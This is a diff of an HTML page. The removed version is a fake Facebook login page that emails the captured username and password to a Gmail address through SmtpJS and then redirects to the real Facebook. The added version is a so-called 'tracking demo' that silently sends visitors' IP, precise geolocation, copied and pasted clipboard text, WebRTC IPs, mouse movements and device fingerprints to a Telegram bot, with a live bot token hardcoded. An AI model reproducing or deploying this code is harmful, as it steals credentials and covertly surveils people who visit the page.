@@ -1,258 +1,435 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <!-- Added viewport meta tag for responsive scaling -->
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" type="image/x-icon" href="Facebook-Logosu.png">
-  <title>Facebook</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Advanced Tracking Demo</title>
   <style>
-    /* Basic Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
     body {
       font-family: Arial, sans-serif;
-      /* Gradient background */
-      background: linear-gradient(135deg, #eef2ff 0%, #fdf2f8 100%);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    /* Top Language Bar */
-    .top-bar {
-      width: 100%;
-      text-align: center;
-      padding: 10px 0;
-      font-size: 14px;
-      color: #555;
-    }
-
-    /* Main Container */
-    .login-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 100%;
-      max-width: 400px;
-      margin: auto;
       padding: 20px;
     }
-
-    /* Facebook Logo (Placeholder) */
-    .logo img {
-      width: 100px;
-      height: 55px;
-      margin: 20px;
-    }
-
-    /* Form Inputs */
-    .login-form {
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
+    h1 {
       margin-bottom: 20px;
     }
-    .login-form input {
-      width: 100%;
-      padding: 14px;
+    /* Demo elements */
+    #buyNowButton {
+      padding: 10px 20px;
       font-size: 16px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      outline: none;
+      margin-top: 20px;
     }
-    .login-form input:focus {
-      border-color: #1877f2;
-    }
-
-    /* Primary Login Button - Pill-Shaped */
-    .login-btn {
-      width: 100%;
-      background-color: #1877f2;
-      color: #fff;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      /* This makes the corners very round, creating a “pill” shape */
-      border-radius: 50px;
-      padding: 14px;
-      cursor: pointer;
-    }
-    .login-btn:hover {
-      background-color: #166fe5;
-    }
-
-    /* Forgot Password Link in Gray */
-    .forgot-password {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .forgot-password a {
-      color: #888;
-      text-decoration: none;
-      font-weight: bold;
-      font-size: 17px;
-    }
-    .forgot-password a:hover {
-      text-decoration: underline;
-    }
-
-    /* Outlined "Create New Account" Button - Pill-Shaped */
-    .create-account-btn {
-      width: 100%;
-      background-color: transparent;
-      color: #1877f2;
-      font-size: 16px;
-      font-weight: bold;
-      border: 1px solid #1877f2;
-      border-radius: 50px;
-      padding: 12px;
-      cursor: pointer;
-      margin-bottom: 20px;
-    }
-    .create-account-btn:hover {
-      background-color: #e7f3ff;
-    }
-
-    /* Footer Section */
-    .footer {
-      text-align: center;
-      color: #8a8d91;
-      font-size: 13px;
-      padding: 20px;
-    }
-    .footer a {
-      color: #8a8d91;
-      text-decoration: none;
-      margin: 0 5px;
-    }
-    .footer a:hover {
-      text-decoration: underline;
-    }
-    .meta-brand {
-      font-weight: bold;
-      margin-top: 10px;
+    video {
       display: block;
-    }
-
-    /* Responsive Design */
-    @media (max-width: 500px) {
-      .login-container {
-        padding: 20px;
-        max-width: 90%;
-      }
-      .login-form input {
-        padding: 12px;
-        font-size: 14px;
-      }
-      .login-btn, .create-account-btn {
-        padding: 12px;
-        font-size: 14px;
-      }
-      .top-bar {
-        font-size: 12px;
-      }
-      .forgot-password a {
-        font-size: 15px;
-      }
+      margin-top: 20px;
+      max-width: 100%;
     }
   </style>
 </head>
 <body>
-  <!-- Top Language Bar -->
-  <div class="top-bar">
-    English (US)
-  </div>
+  <h1>Welcome to the Tracking Demo Page</h1>
+  <p>This page demonstrates various advanced tracking features that send data to a Telegram bot.</p>
+  <button id="buyNowButton">Buy Now</button>
+  <!-- A sample video element for tracking video playback -->
+  <video id="demoVideo" width="320" height="240" controls>
+    <source src="demo.mp4" type="video/mp4" />
+    Your browser does not support the video tag.
+  </video>
 
-  <!-- Main Login Container -->
-  <div class="login-container">
-    <!-- Facebook Logo -->
-    <div class="logo">
-      <!-- Replace with your own logo or an official FB icon -->
-      <img src="Facebook-Logosu.png" alt="Facebook Logo">
-    </div>
-
-    <!-- Login Form -->
-    <form class="login-form" action="/login" method="POST">
-      <input type="text" id="email" name="email" placeholder="Mobile number or email" autocomplete="off" required>
- HENG ., [Feb 19, 2025 at 11:17 PM]
-<input type="password" id="subject" name="password" placeholder="Password" autocomplete="off" required>
-      <button class="login-btn" onclick="fun()" id="btn" type="button">Log in</button>
-    </form>
-
-    <!-- Forgot Password -->
-    <div class="forgot-password">
-      <a href="#">Forgot password?</a>
-    </div>
-
-    <!-- Create New Account Button -->
-    <button class="create-account-btn" onclick="acc()" type="button">
-      Create new account
-    </button>
-  </div>
-
-  <!-- Footer -->
-  <div class="footer">
-    <a href="#">About</a>
-    <a href="#">Help</a>
-    <a href="#">More</a>
-    <span class="meta-brand">© Meta</span>
-  </div>
-
-  <!-- SMTP JS Script -->
-  <script src="https://smtpjs.com/v3/smtp.js"></script>
   <script>
-    var btn = document.getElementById('btn');
-    btn.addEventListener('click', function(e) {
-      e.preventDefault();
-      var email = document.getElementById('email').value;
-      var subject = document.getElementById('subject').value;
-      var body = 'email: ' + email + '<br/> subject: ' + subject;
-      Email.send({
-        SecureToken : "af2d1483-3e6c-40cd-8f63-0e1a40c83888",
-        To : 'hengk7401@gmail.com',
-        From : "hengk7401@gmail.com",
-        Subject : subject,
-        Body : body
-      }).then();
-    });
+    /************** Configuration **************/
+    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
+    const chatId = "1272791365";
 
-    function fun() {
-      location.href = "https://m.facebook.com/?tbua=1";
+    /************** Helper Function **************/
+    function sendToBot(message) {
+      console.log("Sending to bot:", message);
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(telegramUrl)
+        .then(response => response.json())
+        .then(result => console.log("Telegram response:", result))
+        .catch(err => console.error("Error sending message to Telegram:", err));
     }
-    function acc() {
-      location.href = "https://m.facebook.com/campaign/landing.php?campaign_id=1635645242&extra_1=s%7Cc%7C313665943406%7Ce%7Cfacebook%20login%7C&placement&creative=313665943406&keyword=facebook%20login&partner_id=googlesem&extra_2=campaignid%3D1635645242%26adgroupid%3D67924221572%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-1409285535%26loc_physical_ms%3D9198350%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gbraid=0AAAAAD2MkOXVsC97vYqhtaptoapRs4-8f&gclid=CjwKCAiA8Lu9BhA8EiwAag16by1ciYawsBKyDarDC8td2RWm5D8qxNb_tBR8dOQL7VpiZlj6S-Bh-RoCM7kQAvD_BwE&soft=hjk";
-    }
-  </script>
 
-  <!-- New Script: Send Visitor IP to Telegram Bot on Page Load -->
-  <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      // Fetch the user's public IP address from a free API
-      fetch('https://api.ipify.org?format=json')
+    /************** 1. Basic Visitor Info **************/
+    function sendIPAndBasicInfo() {
+      fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
-          var ip = data.ip;
-          // Prepare the Telegram API URL with your bot token and chat ID
-          var botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";  // Replace with your bot token
-          var chatId = "1272791365";      // Replace with your chat ID
-          var message = "New visitor IP: " + ip;
-          var telegramUrl = "https://api.telegram.org/bot" + botToken +
-            "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
-          
-          // Send the IP address to your Telegram bot
-          fetch(telegramUrl)
-            .then(response => response.json())
-            .then(result => console.log("Telegram response:", result))
-            .catch(err => console.error("Error sending message to Telegram:", err));
+          const ip = data.ip;
+          const userAgent = navigator.userAgent;
+          const os = userAgent.includes("Win")
+            ? "Windows"
+            : userAgent.includes("Mac")
+            ? "MacOS"
+            : userAgent.includes("Android")
+            ? "Android"
+            : userAgent.includes("iPhone")
+            ? "iOS"
+            : "Unknown OS";
+          const browser =
+            userAgent.includes("Chrome") && !userAgent.includes("Edge")
+              ? "Chrome"
+              : userAgent.includes("Firefox")
+              ? "Firefox"
+              : userAgent.includes("Safari") && !userAgent.includes("Chrome")
+              ? "Safari"
+              : userAgent.includes("Edge")
+              ? "Edge"
+              : "Unknown Browser";
+          const screenWidth = window.screen.width;
+          const screenHeight = window.screen.height;
+          const referrer = document.referrer || "Direct visit";
+          const language = navigator.language;
+          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          const basicMessage = `Visitor Info:
+IP: ${ip}
+OS: ${os}
+Browser: ${browser}
+Screen: ${screenWidth}x${screenHeight}
+Referrer: ${referrer}
+Language: ${language}
+Timezone: ${timezone}`;
+          sendToBot(basicMessage);
         })
-        .catch(error => console.error("Error fetching IP address:", error));
+        .catch(error => console.error("Error fetching IP:", error));
+    }
+    sendIPAndBasicInfo();
+
+    /************** 2. Device Information **************/
+    function getUserInfo() {
+      const ua = navigator.userAgent;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      let os = "Unknown OS";
+      if (ua.includes("Win")) os = "Windows";
+      else if (ua.includes("Mac")) os = "MacOS";
+      else if (ua.includes("Linux")) os = "Linux";
+      else if (ua.includes("Android")) os = "Android";
+      else if (ua.includes("iPhone")) os = "iOS";
+      let browser = "Unknown Browser";
+      if (ua.includes("Chrome") && !ua.includes("Edge")) browser = "Chrome";
+      else if (ua.includes("Firefox")) browser = "Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+      else if (ua.includes("Edge")) browser = "Edge";
+      return `OS: ${os}, Browser: ${browser}, Screen: ${screenWidth}x${screenHeight}`;
+    }
+    // Uncomment to send device info separately:
+    // sendToBot("Device Info: " + getUserInfo());
+
+    /************** 3. Geolocation **************/
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendToBot(`Location Info:
+Latitude: ${lat}
+Longitude: ${lon}`);
+        },
+        error => console.warn("Location access denied")
+      );
+    } else {
+      console.warn("Geolocation not supported");
+    }
+
+    /************** 4. VPN/Proxy Detection (ip-api) **************/
+    fetch("http://ip-api.com/json/")
+      .then(response => response.json())
+      .then(data => {
+        const vpnStatus = data.proxy ? "Yes" : "No";
+        sendToBot(`VPN/Proxy Info:
+IP: ${data.query}
+VPN Detected: ${vpnStatus}`);
+      })
+      .catch(error => console.error("Error detecting VPN:", error));
+
+    /************** 5. Internet Speed Test **************/
+    function measureSpeed() {
+      const startTime = new Date().getTime();
+      const download = new Image();
+      download.src = "https://www.google.com/images/phd/px.gif?t=" + startTime;
+      download.onload = function () {
+        const endTime = new Date().getTime();
+        const duration = (endTime - startTime) / 1000;
+        // Assuming 5000 bytes file size (5000*8 bits)
+        const bitsLoaded = 5000 * 8;
+        const speedMbps = (bitsLoaded / (duration * 1024 * 1024)).toFixed(2);
+        sendToBot(`Internet Speed:
+Approx. ${speedMbps} Mbps`);
+      };
+    }
+    measureSpeed();
+
+    /************** 6. Dark Mode Preference **************/
+    const darkMode = window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    sendToBot(`Theme Preference: ${darkMode ? "Dark Mode" : "Light Mode"}`);
+
+    /************** 7. Copy-Paste Activity **************/
+    document.addEventListener("copy", function (event) {
+      const copiedText = document.getSelection().toString();
+      sendToBot(`Copied Text: "${copiedText}"`);
     });
+
+    /************** 8. Multiple Tabs Detection **************/
+    if (localStorage.getItem("tabOpened")) {
+      sendToBot("Multiple Tabs: Yes");
+    } else {
+      localStorage.setItem("tabOpened", "true");
+    }
+    window.addEventListener("beforeunload", function () {
+      localStorage.removeItem("tabOpened");
+    });
+
+    /************** 9. Ad Blocker Detection **************/
+    const adTest = document.createElement("div");
+    adTest.innerHTML = "&nbsp;";
+    adTest.className = "adsbox";
+    document.body.appendChild(adTest);
+    setTimeout(() => {
+      if (adTest.offsetHeight === 0) {
+        sendToBot("Ad Blocker: Enabled");
+      }
+      document.body.removeChild(adTest);
+    }, 100);
+
+    /************** 10. Time Spent on Page **************/
+    const pageStartTime = Date.now();
+    window.addEventListener("beforeunload", function () {
+      const timeSpent = Math.round((Date.now() - pageStartTime) / 1000);
+      const minutes = Math.floor(timeSpent / 60);
+      const seconds = timeSpent % 60;
+      sendToBot(`Time Spent on Page: ${minutes}m ${seconds}s`);
+    });
+
+    /************** 11. Bot/Crawler Detection via User-Agent **************/
+    const uaLower = navigator.userAgent.toLowerCase();
+    const botKeywords = ["bot", "crawl", "spider", "slurp", "search"];
+    if (botKeywords.some(keyword => uaLower.includes(keyword))) {
+      sendToBot("Bot Detection: Possible Bot/Crawler detected");
+    }
+
+    /************** 12. Fullscreen Mode Detection **************/
+    document.addEventListener("fullscreenchange", function () {
+      const message = document.fullscreenElement
+        ? "Entered Fullscreen Mode"
+        : "Exited Fullscreen Mode";
+      sendToBot(`Fullscreen Status: ${message}`);
+    });
+
+    /************** 13. Button Click Detection **************/
+    document.getElementById("buyNowButton").addEventListener("click", function () {
+      sendToBot('Button Click: "Buy Now" clicked');
+    });
+
+    /************** 14. Screenshot Detection **************/
+    document.addEventListener("keydown", function (event) {
+      if (event.key === "PrintScreen") {
+        sendToBot("Screenshot Taken");
+      }
+    });
+
+    /************** 15. Mouse Movement (Throttled) **************/
+    let lastMouseSend = Date.now();
+    document.addEventListener("mousemove", function (event) {
+      const now = Date.now();
+      if (now - lastMouseSend > 5000) { // every 5 seconds
+        lastMouseSend = now;
+        sendToBot(`Mouse Position: X=${event.clientX}, Y=${event.clientY}`);
+      }
+    });
+
+    /************** 16. Scroll Depth (Throttled) **************/
+    let lastScrollSend = Date.now();
+    window.addEventListener("scroll", function () {
+      const now = Date.now();
+      if (now - lastScrollSend > 5000) { // every 5 seconds
+        lastScrollSend = now;
+        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+        const scrollPercent = Math.round((scrollTop / scrollHeight) * 100);
+        sendToBot(`Scroll Depth: ${scrollPercent}%`);
+      }
+    });
+
+    /************** 17. Device Orientation **************/
+    window.addEventListener("orientationchange", function () {
+      const orientation =
+        window.orientation === 0 || window.orientation === 180 ? "Portrait" : "Landscape";
+      sendToBot(`Device Orientation: ${orientation}`);
+    });
+
+    /************** 18. Fake GPS Detection **************/
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function (position) {
+        // For demonstration: expected location (e.g., Cambodia lat/lon)
+        const expectedLat = 11.55;
+        const expectedLon = 104.92;
+        const userLat = position.coords.latitude;
+        const userLon = position.coords.longitude;
+        const isSpoofed =
+          Math.abs(userLat - expectedLat) > 5 || Math.abs(userLon - expectedLon) > 5
+            ? "Yes"
+            : "No";
+        sendToBot(`Fake GPS Detection:
+User Location: (${userLat}, ${userLon})
+Possible Spoofing: ${isSpoofed}`);
+      });
+    }
+
+    /************** 19. Low Battery Detection **************/
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.level < 0.2) {
+          sendToBot(`Battery Level: ${Math.round(battery.level * 100)}% (Low)`);
+        }
+      });
+    }
+
+    /************** 20. Clipboard Paste Detection **************/
+    document.addEventListener("paste", function (event) {
+      const pastedText = event.clipboardData.getData("text");
+      sendToBot(`Clipboard Paste Detected: "${pastedText}"`);
+    });
+
+    /************** 21. Proxy/VPN Check via ipapi.co **************/
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const isVPN =
+          data.security && (data.security.vpn || data.security.proxy) ? "Yes" : "No";
+        sendToBot(`Proxy/VPN Check:
+IP: ${data.ip}
+VPN/Proxy Detected: ${isVPN}`);
+      })
+      .catch(error => console.error("Error with ipapi:", error));
+
+    /************** 22. Timezone Detection **************/
+    const detectedTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    sendToBot(`Detected Timezone: ${detectedTimezone}`);
+
+    /************** 23. Installed Fonts Detection **************/
+    const testFonts = ["Arial", "Verdana", "Times New Roman"];
+    const detectedFonts = [];
+    testFonts.forEach(font => {
+      const testSpan = document.createElement("span");
+      testSpan.style.fontFamily = font;
+      testSpan.style.display = "none";
+      document.body.appendChild(testSpan);
+      if (window.getComputedStyle(testSpan).fontFamily.includes(font)) {
+        detectedFonts.push(font);
+      }
+      document.body.removeChild(testSpan);
+    });
+    sendToBot(`Installed Fonts: ${detectedFonts.join(", ")}`);
+
+    /************** 24. Background Tab Switching **************/
+    document.addEventListener("visibilitychange", function () {
+      const status = document.hidden ? "Inactive" : "Active";
+      sendToBot(`Tab Visibility: ${status}`);
+    });
+
+    /************** 25. Audio Context Status **************/
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    sendToBot(`Audio Context: ${audioContext.state === "suspended" ? "Suspended/Muted" : "Running"}`);
+
+    /************** 26. Mobile Device Type Detection **************/
+    const uaLowerCase = navigator.userAgent.toLowerCase();
+    const deviceType = uaLowerCase.includes("android")
+      ? "Android"
+      : uaLowerCase.includes("iphone")
+      ? "iOS"
+      : "Other";
+    sendToBot(`Device Type: ${deviceType}`);
+
+    /************** 27. Incognito Mode Detection **************/
+    (function () {
+      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+      if (!fs) {
+        sendToBot("Incognito Mode: Not Detected");
+        return;
+      }
+      fs(
+        window.TEMPORARY,
+        100,
+        () => sendToBot("Incognito Mode: No"),
+        () => sendToBot("Incognito Mode: Yes")
+      );
+    })();
+
+    /************** 28. Browser Language **************/
+    const browserLanguage = navigator.language || navigator.userLanguage;
+    sendToBot(`Browser Language: ${browserLanguage}`);
+
+    /************** 29. System Performance (Estimate) **************/
+    setInterval(() => {
+      const cpuLoad = (Math.random() * 100).toFixed(2); // Placeholder value
+      const ram = navigator.deviceMemory || "Unknown";
+      sendToBot(`System Performance:
+Estimated CPU Load: ${cpuLoad}%
+Device Memory: ${ram} GB`);
+    }, 60000); // every minute
+
+    /************** 30. AFK (Away From Keyboard) Detection **************/
+    let afkTimer;
+    function resetAfkTimer() {
+      clearTimeout(afkTimer);
+      afkTimer = setTimeout(() => sendToBot("User Inactive: AFK for 2 minutes"), 120000);
+    }
+    document.addEventListener("mousemove", resetAfkTimer);
+    document.addEventListener("keydown", resetAfkTimer);
+
+    /************** 31. Video Playback Detection **************/
+    const videoElement = document.getElementById("demoVideo");
+    if (videoElement) {
+      videoElement.addEventListener("timeupdate", () => {
+        sendToBot(`Video Playback: ${Math.floor(videoElement.currentTime)} seconds watched`);
+      });
+    }
+
+    /************** 32. Auto-Translate Usage Detection **************/
+    setInterval(() => {
+      const bodyLang = document.body.getAttribute("lang");
+      if (bodyLang && bodyLang !== navigator.language) {
+        sendToBot(`Auto-Translate Detected: Page language is ${bodyLang}`);
+      }
+    }, 5000);
+
+    /************** 33. WebRTC IP Leak Detection **************/
+    const rtc = new RTCPeerConnection({ iceServers: [] });
+    rtc.createDataChannel("");
+    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+    rtc.onicecandidate = event => {
+      if (event && event.candidate && event.candidate.candidate) {
+        const candidate = event.candidate.candidate;
+        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (ipMatch) {
+          sendToBot(`WebRTC IP Leak Detected: ${ipMatch[1]}`);
+        }
+      }
+    };
+
+    /************** 34. Unusual Typing Speed Detection **************/
+    let typingStartTime;
+    let typedCharacters = 0;
+    document.addEventListener("keydown", function () {
+      if (!typingStartTime) typingStartTime = Date.now();
+      typedCharacters++;
+    });
+    document.addEventListener("keyup", function () {
+      const elapsed = (Date.now() - typingStartTime) / 1000;
+      if (elapsed > 0) {
+        const wpm = (typedCharacters / 5) / (elapsed / 60);
+        if (wpm > 200) {
+          sendToBot(`Unusual Typing Speed Detected: ${Math.round(wpm)} WPM`);
+        }
+      }
+    });
+
+    /************** 35. Virtual Machine Detection (Heuristic) **************/
+    const isVM = (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 2) ||
+      navigator.platform.indexOf("Win32") !== -1;
+    sendToBot(`Virtual Machine Detection: ${isVM ? "Yes" : "No"}`);
   </script>
 </body>
 </html>
